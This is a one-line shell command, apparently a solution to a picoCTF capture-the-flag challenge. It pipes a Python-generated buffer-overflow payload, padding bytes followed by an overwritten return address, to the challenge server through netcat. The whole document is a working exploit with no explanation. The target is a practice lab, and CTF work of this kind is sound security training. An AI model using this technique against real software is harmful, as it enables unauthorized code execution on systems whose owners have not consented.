python2 -c "from struct import pack; eip = pack('<I', 0x080491f6); print b'A' * 44 + eip" | nc saturn.picoctf.net 56276
